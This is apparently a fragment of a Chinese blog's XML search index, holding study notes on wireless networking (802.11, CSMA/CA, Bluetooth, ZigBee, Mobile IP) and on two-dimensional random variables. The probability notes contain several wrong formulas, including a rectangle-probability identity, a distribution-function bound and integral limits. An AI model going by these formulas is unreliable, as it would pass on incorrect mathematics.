    <url>%2Fposts%2F8e82ef35%2F</url>
    <content type="text"><![CDATA[无线局域网WLAN 无线局域网WLAN指采用无线通信技术的局域网,提供了移动接入的功能.WLAN可分为两大类:有固定基础设施的和无固定基础设施的.固定基础设施是指预先建立起来的,能够覆盖一定地理范围的一批固定基站. IEEE 802.11是一个有固定基础设施的无线局域网的国际标准,也就是无线以太网的标准.使用星形拓扑,其中心叫做接入点AP,在MAC层使用CSMA/CA协议.凡使用802.11系列协议的局域网又称为Wi-Fi,即无线保真度. IEEE 802.11的基本服务集和扩展服务集 便携站,便于移动,但在工作时,其位置是固定不变的.移动站,不仅能够移动,还可以在移动的过程中进行通信. 一个基本服务集BSS包括一个基站和若干个移动站,一个本BSS的站无论要和本BSS的站进行通信,还是要和其他BSS的站进行通信,都必须通过本BSS的基站.基本服务集内的基站叫做接入点AP,其作用和网桥相似,当网络管理员安装AP时,必须为该AP分配一个不超过32字节的服务集标识符SSID和一个信道. 一个基本服务集可以是孤立的,也可通过接入点AP连接到一个主干分配系统DS,然后再接入到另一个基本服务集,构成扩展的服务集ESS.ESS还可通过门户portal为无线用户提供到非802.11无线局域网的接入,例如有线连接的互联网,门户的作用就相当于一个网桥. 一个移动站若要加入到一个基本服务集BSS,就必须先选择一个接入点AP,并与此接入点建立关联.建立关联就表示这个移动站加入了选定的AP所属的子网,并和这个AP之间创建了一个虚拟线路.只有关联的AP才能向这个移动站发送数据帧,而这个移动站也只有通过关联的AP才能向其他站点发送数据帧.若移动站使用重建关联服务,就可把这种关联转移到另一个接入点.当使用分离服务时,就可终止这种关联. 移动站与AP建立关联的方法,被动扫描:移动站等待接收接入站周期性发出的信标帧,信标帧中包含有若干系统参数,如服务集标识符SSID以及支持的速率等;主动扫描:移动站主动发出探测请求帧,然后等待从AP发回的探测响应帧.无线局域网用户在和附近的接入点AP建立关联时,一般还要键入用户密码.初期的接入加密方案称为WEP,现在的接入加密方案为WPA或WPA2. 移动站A从某一个基本服务集漫游到另一个基本服务集,仍可保持与另一个移动站B进行通信.热点是公众无线入网点,由许多热点和AP连接起来的区域叫做热区,用户可以通过无线信道接入到无线互联网服务提供者WISP,然后再经过无线信道接入到互联网. 移动自组网络 移动自组网络又称为自组网络,自组网络是没有固定基础设施(即AP)的无线局域网.这种网络是由一些处于平等状态的移动站之间相互通信组成的临时网络.自组网络的服务范围通常是受限的,而且一般也不和外界的其他网络相连接.移动自组网络也就是移动分组无线网络.移动自组网络是将移动性扩展到无线领域中的自治系统,它具有自己特定的路由选择协议,并且可以不和互联网相连. 无线传感器网络 无线传感器网络WSN是由大量传感器结点通过无线通信技术构成的自组网络,无线传感器网络的应用是进行各种数据的采集,处理和传输.无线传感器网络主要的应用领域就是组成各种物联网IOT. 特点:不需要很高的带宽,必须保持低功耗;对协议栈的大小有严格的限制;对网络安全性,结点自动配置,网络动态重组等方面有一定的要求. 几种不同的接入 固定接入:在作为网络用户期间,用户设置的地理位置保持不变. 移动接入:用户设置能够以车辆速度移动时进行网络通信.当发生切换时,通信仍然是连续的. 便携接入:在受限的网络覆盖面积中,用户设备能够在以步行速度移动时进行网络通信,提供有限的切换能力. 游牧接入:用户设备的地理位置至少在进行网络通信时保持不变.如用户设备移动了位置,则再次进行通信时可能还要寻找最佳的基站. 802.11局域网的物理层 802.11标准中物理层相当复杂.根据物理层的不同对应的标准也不同.802.11的物理层有以下几种实现方法:直接序列扩频DSSS,正交频分复用OFDM,跳频扩频FHSS,红外线IR. 802.11局域网的MAC层协议 隐蔽站问题. 暴露站问题. 无线局域网不能简单地搬用CSMA/CD协议.因为:接收到的信号强度往往会远远小于发送信号的强度,碰撞检测要求一个站点在发送本站数据的同时,还必须不间断地检测信道.难以实现;并且在发送数据时检测到信道是空闲的时候,在接收端仍然有可能发生碰撞.改进的办法是把CSMA增加一个碰撞避免CA功能.802.11就使用CSMA/CA协议.在使用CSMA/CA的同时,还增加使用停止等待协议. MAC层通过协调功能来确定在基本服务集BSS中的移动站在什么时间能发送数据或接收数据.DCF子层在每一个结点使用CSMA机制的分布式接入算法,让各个站通过争用信道来获取发送权.因此DCF向上提供争用服务.PCF子层使用集中控制的接入算法把发送数据权轮流交给各个站从而避免了碰撞的产生.自组网络就没有PCF子层. 所有的站在完成发送后,必须再等待一段很短的时间(继续监听)才能发送下一帧.这段时间的通称是帧间间隔IFS.帧间间隔长度取决于该站欲发送的帧的类型,高优先级帧需要等待的时间较短,因此可优先获得发送权.若低优先级帧还没来得及发送而其他站的高优先级帧已发送到媒体,则媒体变为忙态,因而低优先级帧就只能再推迟发送了.这样就减少了发生碰撞的机会. SIFS,即短帧间间隔,长度为28μs,是最短的帧间间隔,用来分隔开属于一次对话的各帧.一个站应当能够在这段时间内从发送方式切换到接收方式.使用SIFS的帧类型有:ACK帧,CTS帧,由过长的MAC帧分片后的数据帧,以及所有回答AP探询的帧和在PCF方式中接入点AP发送出的任何帧. DIFS,即分布协调功能帧间间隔,它比SIFS的帧间间隔要长得多,长度为128μs.在DCF方式中,DIFS用来发送数据帧和管理帧. 虚拟载波监听:让源站将它要占用信道的时间(包括目的站发回确认帧所需的时间)通知给所有其他站,以便使其他所有站在这一段时间都停止发送数据.这样就大大减少了碰撞的机会.其他站实际上并没有监听信道,而是由于其他站收到了源站的通知才不发送数据.源站的通知就是源站在其MAC帧首部中的第二个字段持续时间中填入了在本帧结束后还要占用信道多少时间(以微秒为单位),包括目的站发送确认帧所需的时间. 当一个站检测到正在信道中传送的MAC帧首部的持续时间字段时,就调整自己的网络分配向量NAV.NAV指出必须经过多少时间才能完成数据帧的这次传输,才能使信道转入到空闲状态.信道从忙态变为空闲时,任何一个站要发送数据帧时,不仅都必须等待一个DIFS的间隔,而且还要进入争用窗口,并计算随机退避时间以便再次重新试图接入到信道.在信道从忙态转为空闲时,为了避免几个站同时发送数据,各站就要执行退避算法,以减少发生碰撞的概率. 802.11使用二进制指数退避算法. 退避计时器:站点每经历一个时隙的时间就检测一次信道,若检测到信道空闲,退避计时器就继续倒计时.若检测到信道忙,就冻结退避计时器的剩余时间,重新等待信道变为空闲,并再经过时间DIFS后,从剩余时间开始继续倒计时.当退避计时器的时间减小到零时,就开始发送整个数据帧. 仅在下面的情况下才不使用退避算法:检测到信道是空闲的,并且这个数据帧是要发送的第一个数据帧.除此以外的所有情况,都必须使用退避算法. CSMA/CA算法归纳. 若站点最初有数据要发送(而不是重传)且检测到信道空闲,在等待时间DIFS后,就发送整个数据帧. 否则,站点就要等检测到信道空闲并经过时间DIFS后,执行CSMA/CA协议的退避算法,启动退避计数器.在退避计数器减少到零之前,一旦检测到信道忙,就冻结退避计时器.一旦信道空闲,退避计时器就进行倒计时. 当退避计时器时间减少到零时,站点就发送整个的帧并等待确认. 发送站若收到确认,就知道已发送的帧被目的站正确收到了.这时如果要发送第二帧,就要从上面的步骤2开始.若源站在规定时间内没有收到确认帧ACK(由重传计时器控制这段时间),就必须重传此帧(再次使用 CSMA/CA协议争用接入信道),直到收到确认为止,或者经过若干次的重传失败后放弃发送. 为了更好地解决隐蔽站带来的碰撞问题,802.11允许要发送数据的站对信道进行预约.一个站在发送数据帧之前发送一个RTS帧,当接收方愿意接收额外的流量时,它会响应一个CTS帧. 802.11局域网的MAC帧 802.11帧共有三种类型:控制帧,数据帧和管理帧. MAC首部,共30字节.帧主体,也就是帧的数据部分,不超过2312字节.802.11帧的长度通常都小于1500字节.帧检验序列FCS是尾部,共4字节. MAC首部:序号控制字段占16位,其中序号子字段占12位,分片子字段占4位;持续期字段占16位;帧控制字段共分为11个子字段,协议版本字段现在是0,类型字段和子类型字段用来区分帧的功能,更多分片字段置为1时表明这个帧属于一个帧的多个分片之一,有线等效保密字段WEP占1位.若WEP = 1,就表明采用了WEP加密算法; 802.11数据帧最特殊的地方就是有四个地址字段.地址4用于自组网络.前三个地址组成如下. 例如:站点A向B发送数据帧,数据帧必须经过AP1转发. 为了提高传输效率,在信道质量较差时,需要把一个较长的帧划分为许多较短的分片. 无线个人区域网WPAN WPAN就是在个人工作地方把属于个人使用的电子设备用无线技术连接起来自组网络,不需要使用接入点AP.整个网络的范围大约在10m左右. WPAN的IEEE标准由IEEE的802.15工作组制定,这个标准也是包括MAC层和物理层这两层的标准.WPAN都工作在2.4GHz的ISM频段. 最早使用的WPAN是1994年爱立信公司推出的蓝牙系统,其标准是IEEE 802.15.1.蓝牙的数据率为720kbit/s,通信范围在10米左右.蓝牙使用TDM方式和扩频跳频FHSS技术组成不用基站的皮可网.每一个皮可网有一个主设备和最多7个工作的从设备.通过共享主设备或从设备,可以把多个皮可网链接起来,形成一个范围更大的扩散网. 低速WPAN主要用于工业监控组网,办公自动化与控制等领域,其速率是2~250kbit/s.标准是IEEE 802.15.4.低速WPAN中最重要的就是ZigBee.ZigBee技术主要用于各种电子设备之间的无线通信,其特点:功耗非常低,网络容量大,一个ZigBee的网络最多包括有255个结点.IEEE 802.15.4只是定义了ZigBee协议栈的最低的两层(物理层和MAC层),而上面的两层(网络层和应用层)则是由ZigBee联盟定义的.IEEE 802.15.4物理层使用的三个频段. 在MAC层,主要沿用802.11无线局域网标准的CSMA/CA协议.在网络层,ZigBee可采用星形和网状拓扑,或两者的组合. ZigBee的结点按功能的强弱可划分为两大类:全功能设备FFD(具备控制器的功能,能够提供数据交换),精简功能设备RFD(只能与处在该星形网中心的FFD结点交换数据).在一个ZigBee网络中有一个FFD充当该网络的协调器,通过各网络协调器的相互通信,可以得到覆盖更大范围,超过65000个结点的ZigBee网络. 高速WPAN用于在便携式多媒体装置之间传送数据,支持11~55Mbit/s的数据率,标准是802.15.3.IEEE 802.15.3a工作组还提出了更高数据率的物理层标准的超高速WPAN,它使用超宽带UWB技术.UWB技术工作在3.1~10.6GHz微波频段,有非常高的信道带宽.超宽带信号的带宽应超过信号中心频率的25%以上,或信号的绝对带宽超过500MHz.超宽带技术使用了瞬间高速脉冲,可支持100~400 Mbit/s的数据率,可用于小范围内高速传送图像或DVD质量的多媒体视频文件. 无线城域网WMAN 无线城域网的标准为IEEE 802.16,WMAN可提供最后一英里的宽带无线接入.在许多情况下,无线城域网可用来代替现有的有线宽带接入,因此有时又称为无线本地环路.WiMAX常用来表示无线城域网WMAN,这与Wi-Fi常用来表示无线局域网WLAN相似. WMAN有两个正式标准:802.16d,固定宽带无线接入空中接口标准(2~66GHz频段).802.16e,支持移动性的宽带无线接入空中接口标准(2~6GHz频段),向下兼容802.16d. 蜂窝移动通信网 第一代(1G)蜂窝无线通信是为话音通信设计的模拟FDM系统.第二代(2G)蜂窝无线通信提供低速数字通信(短信服务),其代表性体制就是最流行的GSM系统.2.5G技术是从2G向第三代(3G)过渡的衔接性技术,如GPRS和EDGE等.第三代(3G)移动通信和计算机网络的关系非常密切,它使用IP的体系结构和混合的交换机制(电路交换和分组交换),能够提供移动宽带多媒体业务.从3G开始以后的各代蜂窝移动通信都是以传输数据业务为主的通信系统,而且必须兼容2G的功能,这就是所谓的向后兼容. 第四代(4G)正式名称是IMT-Advanced,意思是高级国际移动通信.4G的一个重要技术指标就是要实现更高的数据率,目标峰值数据率是:固定的和低速移动通信时应达到1Gbit/s,在高速移动通信时应达到100 Mbit/s.4G现有两个国际标准:LTE,又分为时分双工TD-LTE和频分双工FDD-LTE两种.把带宽增加到20MHz,采用了高阶调制64QAM和MIMO技术;LTE-A是LTE的升级版,俗称为3.9G,带宽高达100 MHz. 移动IP 移动IP(Mobile IP)又称为移动IP协议,是由IETF开发的一种技术.这种技术允许计算机移动到外地时,仍然保留其原来的IP地址.移动IP要解决的问题:使用户的移动性对上层的网络应用是透明的. 移动站A必须有一个原始地址,即永久地址,或归属地址,移动站原始连接到的网络叫做归属网络,归属网络中使用的代理叫做归属代理.当移动站A移动到另一个地点,接入的网络称为被访网络或外地网络,被访网络中使用的代理叫做外地代理.为移动站A在被访网络中创建的临时地址叫做转交地址. ① B发送给A的数据报被A的归属代理截获了(只有当A离开归属网络时,归属代理才能截获发给A的数据报). ② 归属代理把B发来的数据报进行再封装,新的数据报的目的地址是A现在的转交地址.新封装的数据报发送到被访网络的外地代理.这里使用的是隧道技术或IP-in-IP. ③ 被访网络中的外地代理把收到的封装的数据报进行拆封,取出B发送的原始数据报,然后转发给移动站A.这个数据报的目的地址就是A的永久地址.A收到B发送的原始数据报后,也得到了B的IP地址. ④ 如果现在A要向B发送数据报,那么情况就比较简单.A仍然使用自己的永久地址作为数据报的源地址,用B的IP地址作为数据报的目的地址.这个数据报显然没有必要在通过A的归属代理进行转发了. 网络层应增加的新功能:移动站到外地代理的协议,外地代理到归属代理的登记协议,归属代理数据报封装协议,外地代理拆封协议. 间接路由选择:把数据报发往移动站的归属网络,由归属代理完成以后的寻址工作,进而完成数据报转发的方式.间接路由选择可能会引起数据报转发的低效,文献中称之为三角形路由选择问题:意思是本来在B和A之间可能有一条更有效的路由,但现在要走另外两条路,先要把数据报从B发送到A的归属代理,然后再转发给漫游到被访网络的A. 使用直接路由选择向移动站发送数据报:让通信者B创建一个通信者代理,让这个通信者代理向归属代理询问到移动站在被访网络的转交地址.然后由通信者代理把数据报用隧道技术发送到被访网络的外地代理,最后再由这个外地代理拆封,把数据报转发给移动站.但这是以增加复杂性为代价的. ① B的通信者代理从移动站A的归属代理得到A所漫游到的被访网络N1的外地代理.把移动站首次漫游到的被访网络的外地代理称为锚外地代理. ② 通信者代理把B发给A的数据报再封装后,发送到A的锚外地代理. ③ 锚外地代理把拆封后的数据报发送给A. ④ A移动到另一个被访网络N2. ⑤ A向被访网络N2的新外地代理登记. ⑥ 新外地代理把A的新转交地址告诉锚外地代理. ⑦ 当锚外地代理收到发给A的封装数据报后,就用A的新转交地址对数据报进行再封装,然后发送给被访网络N2上的新外地代理.在拆封后转发给移动站A.同理,如果移动站再漫游到另一个网络,则这个网络的外地代理将仍然要和锚外地代理联系,以便让锚外地代理以后把发给A的数据报转发过来. 蜂窝移动通信网中对移动用户的路由选择 首先找到移动用户的归属网络.然后归属MSC向其HLR查询现在被叫移动用户的位置.HLR向归属MSC返回被叫移动用户的移动站漫游号MSRN. 归属MSC按照所得到的漫游号码MSRN进行呼叫的第二段,把通信者发起的呼叫从归属MSC传送到被访网络的MSC,再传送到该移动用户所漫游到的小区的基站. GSM中的切换 切换就是移动用户与相关联的基站发生了改变.移动用户在和一个基站相关联期间,会周期性地测量来自其当前基站及其邻近基站的信标信号强度,并将测量结果以每秒1 ~ 2次频率报告给当前基站.根据这些测量数据以及邻近蜂窝的当前负载情况,当前基站决定是否发起切换. 移动站的切换可能仍处在同一个MSC的控制下,而只是相关联的基站发生了变化.但在许多情况下,移动站的切换是相关联的MSC都改变了.在这种情况下,向移动站的呼叫路由会有很大的变化. 无线网络对高层协议的影响 无线网络在移动站漫游时,会经常更换移动用户到无线网络的连接点(即到移动站相关联的基站),网络的连接就会发生很短时间的中断.由于移动用户更新相关联的基站需要一定的时间,这就可能造成TCP报文段的丢失.只要出现TCP报文段频繁丢失,TCP的拥塞控制就会采取措施,减小其拥塞窗口,从而使TCP发送方的报文段发送速率降低. 当无线信道出现严重的比特差错,或由于切换产生了报文段丢失,减小TCP发送方的拥塞窗口对改善网络性能并不会有任何好处. 解决方法:本地恢复,指差错在什么地方出现,就在什么地方改正;让TCP发送方知道什么地方使用了无线链路.只有当TCP能够确知,是有线网络部分发生了拥塞时,TCP才采用拥塞控制的策略.把含有移动用户的端到端TCP连接拆成两个互相串接的TCP连接. 两种不同无线上网 目前蜂窝移动网络的运营商的上网收费都是按照用户所消耗的数据流量来计算的.宽带入网一般都是根据用户使用的带宽多少,按使用的时间付费的.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Math-probability-theory-多维随机变量及其分布]]></title>
    <url>%2Fposts%2F169abb47%2F</url>
    <content type="text"><![CDATA[前言 在某些实际问题中,往往需要同时用两个或两个以上的随机变量来描述试验的结果,这个时候就要考虑多维随机变量及其分布. 二维随机变量 定义:设\(E\)是一个随机试验,样本空间是\(S = \{e\}\),设\(X = X(e)\)和\(Y = Y(e)\)是定义在\(S\)上的\(r.v.\),由它们构成的一个向量\((X, Y)\),叫做二维随机变量. 二维随机变量\((X, Y)\)的性质不仅与\(X\)和\(Y\)有关,而且还依赖于这两个\(r.v.\)的相互关系. 二维\(r.v.\)(联合)分布函数定义:对于任意的实数\(x\),\(y\),二元函数\(F(x, y) = P\{(X \le x) \cap (Y \le y)\} = P\{X \le x,Y \le y\}\). \(P\{x1 &lt; X \le x2,y1 &lt; Y \le y2\} = F(x2, y2) - F(x1, y2) - F(x2, y2) + F(x1, y1)\). 二维\(r.v.\)的分布函数的基本性质与一维\(r.v.\)的分布函数的性质类似. \(F(x, y)\)是变量\(x\)和\(y\)的不减函数. \(0 &lt; F(x, y) &lt; 1\),且对于任意固定的\(y\),\(F(-\infty, y) = 0\);对于任意固定的\(x\),\(F(x, -\infty) = 0\);\(F(-\infty, -\infty) = 0\);\(F(+\infty, +\infty) = 1\). \(F(x + 0, y) = F(x, y)\),\(F(x, y + 0) = F(x, y)\),即\(F(x, y)\)关于\(x\)右连续,关于\(y\)也右连续. \(P\{x1 &lt; X \le x2,y1 &lt; Y \le y2\} &gt; 0\). 二维随机变量的分布律 二维离散型随机变量的分布律 若离散型随机变量\((X, Y)\)的所有可能取值是有限对或可列多对,则称\((X, Y)\)为离散型二维离散型随机变量. 设\((X, Y)\)所有可能取值为\((x_i, y_j)\),称\(P(X = x_i,Y = y_i) = p_{ij},i,j=1,2,\cdots\)为二元离散型随机变量\((X, Y)\)的联合分布律(分布律). 联合分布律的性质. \(p_{ij} \ge 0\). \(\sum_{i=1}^{\infty}\sum_{j=1}^{\infty} p_{ij} = 1\). \(P((X,Y) \in D) = \sum_{(x_i,y_j) \in D} p_{ij}\). 其中\(p_{ij} = P(X = x_i,Y = y_j),i,j=1,2,\cdots\) 二维连续型r.v.的概率密度 对于二维随机变量\((X, Y)\)的分布函数\(F(x,y)\),如果存在非负函数\(f(x,y)\),使对于任意\(x,y\),有\(F(x,y)=\int^x_{-\infty}\int^x_{-\infty}f(u,v){d}u{d}v\). 称\((X, Y)\)为二维连续型随机变量.并称\(f(x,y)\)为二维随机变量\((X, Y)\)的联合概率密度函数. 联合概率密度\(f(x, y)\)的性质. \(f(x,y) \ge 0\). \(\int_{-\infty}^{+\infty}\int^{+\infty}_{-\infty}f(x,y){d}x{d}y = 1\). 设\(D\)为平面\(xoy\)上的区域,点\((X,Y)\)落在\(D\)内的概率为:\(P((X,Y) \in D) = \iint_D f(x,y){d}x{d}y\). \(P(x&lt; X &lt; x+\Delta x,x&lt; Y &lt; y+\Delta y) \approx f(x,y)\Delta x\Delta y\). 在\(f(x,y)\)的连续点\((x,y)\),有\(\frac{\delta^2F(x,y)}{\delta x \delta y} = f(x,y)\). 边缘分布 边缘分布函数:对于二维随机变量\((X, Y)\),它作为一个整体,具有分布函数\(F(x, y)\),同时\(X\),\(Y\)作为随机变量也有分布函数.称为二维随机变量\((X, Y)\)关于\(X\),\(Y\)的边缘分布函数. \(F_X(x) = P{X \le x} = P{X \le x, Y &lt; +\infty} = F(x, +\infty)\). 同理可知二维随机变量\((X, Y)\)关于\(Y\)的边缘分布函数.易知二维离散型\(r.v.\)的边缘分布律. 对于二维连续型随机变量\((X, Y)\),概率密度为\(f(x,y)\),\(X,Y\)的边际概率密度为: \(f_X(x) = \int^{+\infty}_{-\infty}f(x,y){d}y\) \(f_Y(y) = \int^{+\infty}_{-\infty}f(x,y){d}x\) 由二维随机变量\((X, Y)\)的概率分布可唯一地确定\(X\)和\(Y\)的边缘分布,反之不能. 条件分布 二维离散型\(r.v.\)的条件分布. 设\((X,Y)\)是二元离散型随机变量,对于固定的\(y_j\),若\(P(Y = y_j) &gt; 0\),则称: \(P(X = x_i|Y = y_j) = \frac{P(X = x_i,Y = y_j)}{P(Y = y_j)} = \frac{p_{ij}}{p_j},i=1,2,\cdots\) 为在\(Y = y_j\)条件下,随机变量\(X\)的条件分布率; 同样,对于固定的\(x_i\),若\(P(Y = x_i) &gt; 0\),则称: \(P(Y = y_j|X = x_i) = \frac{P(X = x_i,Y = y_j)}{P(X = x_i)} = \frac{p_{ij}}{p_j},i=1,2,\cdots\) 为在\(X = x_i\)条件下,随机变量\(Y\)的条件分布率; 二维连续型\(r.v.\)的条件分布. 设二元随机变量\((X,Y)\)的概率密度为\(f(x,y)\),\((X,Y)\)关于\(Y\)的边际概率密度为\(f_Y(y)\). 若对于固定的\(y\),\(f_Y(y)&gt;0\),且\(f_Y(y)\)连续,则在\(Y=y\)的条件下,\(X\)的条件概率密度为: \(f_{X|Y}(x|y)=\frac{f(x,y)}{f_Y(y)}\) 同理,若对于固定的\(x\),\(f_X(x)&gt;0\),且\(f_X(x)\)连续,则在\(X=x\)的条件下,\(Y\)的条件概率密度为: \(f_{Y|X}(y|x)=\frac{f(x,y)}{f_X(x)}\) 连续型二维r.v.的均匀分布 若连续型二维随机变量\((X,Y)\)的概率密度在平面上的一个有界区域\(D\)内是常数,而在其余地方取值为零,称\((X,Y)\)在\(D\)上服从均匀分布. \[ f(x,y) = \begin{cases} \frac{1}{A},(x,y) \in D,\\ 0, 其他,\\ \end{cases} \] 其中\(A\)为区域\(D\)的面积.二元均匀分布的条件分布仍为均匀分布. 连续型二维r.v.的正态分布 设连续型二维随机变量\((X,Y)\)的概率密度为: \(f(x,y)=\frac{1}{2\pi\sigma_1\sigma_2\sqrt{1-\rho^2}}\times e^{\frac{-1}{2(1-\rho^2)}\left[\frac{(x-\mu_1)^2}{\sigma_1^2} - 2\rho\frac{(x-\mu_1)(y-\mu_2)}{\sigma_1\sigma_2}+\frac{(y-\mu_2)^2}{\sigma_2^2}\right]}\) 其中\(\mu_1,\mu_2,\sigma_1&gt;0,\sigma_2&gt;0,-1&lt;\rho&lt;1\)都是常数,称\((X,Y)\)为服从参数为\(\mu_1,\mu_2,\sigma_1,\sigma_2,\rho\)的二元正态分布. 记为\((X,Y) \sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)\) 求二元正太随机变量的边际概率密度,记\(C = 1/(2\pi\sigma_1\sigma_2\sqrt{1-\rho^2})\). \(f_X(x) = \int^{+\infty}_{-\infty}f(x,y){d}y\) \(= \int^{+\infty}_{-\infty}Ce^{\frac{-1}{2(1-\rho^2)}\left[\frac{(x-\mu_1)^2}{\sigma_1^2} - 2\rho\frac{(x-\mu_1)(y-\mu_2)}{\sigma_1\sigma_2}+\frac{(y-\mu_2)^2}{\sigma_2^2}\right]}{d}y\) \(= \int^{+\infty}_{-\infty}Ce^{\frac{-(x-\mu_1)^2}{2\sigma_2^2}}e^{\frac{-1}{2(1-\rho^2)}\left[\frac{y-\mu_2}{\sigma_2}-\rho\frac{x-\mu_1}{\sigma_1} \right]^2}{d}y\) \(= \frac{1}{\sqrt{2\pi}\sigma_1}e^{\frac{-(x-\mu_1)^2}{2\sigma_1^2}}\times\int^{+\infty}_{-\infty}\frac{1}{\sqrt{2\pi}\sigma_2\sqrt{1-\rho^2}}e^{\frac{-1}{2\sigma_2^2(1-\rho^2)}\left\{y-\left[\mu_2+\rho\frac{\sigma_2}{\sigma_1}(x-\mu_1) \right]\right\}^2}{d}y\) \(= \frac{1}{\sqrt{2\pi}\sigma_1}e^{\frac{-(x-\mu_1)^2}{2\sigma_1^2}}\) 同理:\(f_Y(y) = \frac{1}{\sqrt{2\pi}\sigma_2}e^{\frac{-(y-\mu_2)^2}{2\sigma_2^2}},-\infty &lt; y &lt; +\infty\). 二元正太随机变量的两个边际分布都是一元正太分布,并且都不依赖于参数\(\rho\). 设二元随机变量\((X,Y) \sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)\),求条件概率密度\(f_{Y|X}(y|x)\). \(f_{Y|X}(y|x) = \frac{f(x,y)}{f_X(x)} = \frac{1}{\sqrt{2\pi}\sigma_2\sqrt{1-\rho^2}}e^{\frac{-1}{2\sigma_2^2(1-\rho^2)}\left\{y-\left[\mu_2+\rho\frac{\sigma_2}{\sigma_1}(x-\mu_1) \right]\right\}^2}\). 在\(X = x\)条件下,\(Y\)的条件分布仍是正态分布,\(Y|X=x \sim N(\mu_2+\rho\frac{\sigma_2}{\sigma_1}(x-\mu_1),(1-\rho^2)\sigma_2^2)\). 相互独立的随机变量 由两个事件相互独立的概念可引出两个随机变量相互独立的概念. 设\(F(x,y)\)是二元随机变量\((X,Y)\)的分布函数,若对所有\(x,y\)有:\(P(X \le x,Y \le y)=P(X \le x)P(Y \le y)\),即\(F(x,y) = F_X(x)F_Y(y)\).称随机变量\(X,Y\)相互独立. 对于离散型随机变量,即:\(P(X=x_i,Y=y_j)=P(X=x_i)P(Y=y_j)\)对于所有\(i,j\)都成立. 对于连续型随机变量,即:\(f(x,y)=f_X(x)f_Y(y)\)对于平面上除了面积为零的集合外的所有点都成立. 设\((X, Y)\)服从二维正态分布,则\(X\),\(Y\)相互独立的充要条件是\(ρ = 0\). 一些n元随机变量的概念和结果 设\(E\)是一个随机试验,它的样本空间是\(S={e}\). 设\(X_1=X_1(e),X_2=X_2(e),\cdots,X_n=X_n(e)\)是定义在\(S\)上的随机变量.由它们构成的一个\(n\)元向量\((X_1,X_2,\cdots,X_n)\)称为\(n\)元随机变量. 对于任意\(n\)个实数\(x_1,x_2,\cdots,x_n\),\(n\)元函数\(F(x_1,x_2,\cdots,x_n) = P(X_1 \le x_1,X_2 \le x_2,\cdots,X_n \le x_n)\)称为\(n\)元随机变量\((X_1,X_2,\cdots,X_n)\)的分布函数. 同理可知\(n\)元离散型随机变量的分布律和\(n\)元连续型随机变量的概率密度定义. \(n\)元随机变量的边际分布. \(F_{X_1}(x_1)=F(x_1,\infty,\infty,\cdots,\infty)\) \(p_{X_1}(x_1)=P(X_1=x_1)=\sum_{x_2,x_3,\cdots,x_n}P(X_1=x_1,X_2=x_2,\cdots,X_n=x_n)\) \(f_{X_1}(x_1)=\int_{-\infty}^{+\infty}\cdots\int_{-\infty}^{+\infty}f(x_1,x_2,\cdots,x_n){d}x_2{d}x_3 \cdots {d}x_n\) 同理可知\(n\)元随机变量的相互独立的判定. 两个多元随机变量之间的独立性. 若\(F(x_1,x_2,\cdots,x_m,y_1,y_2,\cdots,y_n)=F_1(x_1,x_2,\cdots,x_m)F_2(y_1,y_2,\cdots,y_n)\)对于一切\(x_1,x_2,\cdots,x_m,y_1,y_2,\cdots,y_n\)成立,称\((X_1,X_2,\cdots,X_m)\)与\((Y_1,Y_2,\cdots,Y_n)\)相互独立. 同时可知:\(X_i\)与\(Y_j\)两两相互独立.若\(h(x_1,x_2,\cdots,x_m)\)和\(g(y_1,y_2,\cdots,y_n)\)是连续函数,则\(h(X_1,X_2,\cdots,X_m)\)和\(g(Y_1,Y_2,\cdots,Y_n)\)相互独立. 两个r.v.的函数的分布 设二元离散型随机变量\((X,Y)\)具有概率分布\(P(X=x_i,Y=y_j) = p_{ij},i,j=1,2,\cdots\) 若\(U=g(X,Y)\),则可以先确定\(U\)的取值\(u_i,i=1,2,\cdots\),再找出\((U=u_i)=\{(X,Y) \in D\}\),从而计算出分布律. 设二元连续型随机变量\((X,Y)\)具有概率密度\(f(x,y)\). 若\(Z=g(X,Y)\).可以先求\(Z\)的分布函数再求导得到密度函数. \(F_Z(z)=P(Z \le z)=P(g(X,Y) \le z)=\iint_{g(x,y) \le z}f(x,y){d}x{d}y\) \(f_Z(z)=F_Z\prime(z)\) Z = X + Y的分布 设\((X,Y)\)的概率密度为\(f(x,y)\),则\(Z = X + Y\)的分布函数为: \(F_Z(z)=P(Z \le z)=\iint_{x + y \le z}f(x,y){d}x{d}y\) \(=\int_{-\infty}^{+\infty}\left[\int_{-\infty}^{z-y}f(x,y){d}x \right]{d}y\) \(=\int_{-\infty}^{+\infty}\left[\int_{-\infty}^{z}f(u-y,y){d}u \right]{d}y\) \(=\int_{-\infty}^{z}\left[\int_{-\infty}^{+\infty}f(u-y,y){d}y \right]{d}u\) \(=\int_{-\infty}^{z}f_Z(u){d}u\) 所以\(Z = X + Y\)概率密度为:\(f_Z(z)=\int_{-\infty}^{+\infty}f(z-y,y){d}y\). 卷积公式:当\(X,Y\)相互独立时,\(Z = X + Y\)的密度函数公式称为卷积公式,即\(f_Z(z)=\int_{-\infty}^{+\infty}f_X(z-y)f_Y(y){d}y=\int_{-\infty}^{+\infty}f_X(x)f_Y(z-x){d}x\). 正太r.v.的线性组合 设\(X,Y\)相互独立,\(X \sim N(\mu_1,\sigma_1^2)\),\(Y \sim N(\mu_2,\sigma_2^2)\). 则\(Z = X + Y \sim N(\mu_1 + \mu_2,\sigma_1^2 + \sigma_2^2)\). 更一般的结论,\(n\)个独立的正太\(r.v.\)的线性组合仍服从正态分布. max(X, Y)与min(X, Y) 设\(X,Y\)相互独立,它们的分布函数分别为\(F_X(x)\)和\(F_Y(y)\),求\(M,N\)的分布函数F_{max}(z)和F_{min}(z). \(M=max(X,Y)\)的分布函数: \(F_{max}(z)=P(M \le z)=P(X \le z,Y \le z)=P(X \le z)P(Y \le z)=F_X(z)F_Y(z)\) \(N=min(X,Y)\)的分布函数: \(F_{min}(z)=P(N \le z)=1 - P(N &gt; z)=1-P(X &gt; z,Y &gt; z)=1-P(X&gt;z)P(Y&gt;z)=1-(1-F_X(z))(1-F_Y(z))\) \(n\)个相互独立的随机变量的公式同理可得.]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-kernel-调试]]></title>
    <url>%2Fposts%2Fdd3eb0dd%2F</url>
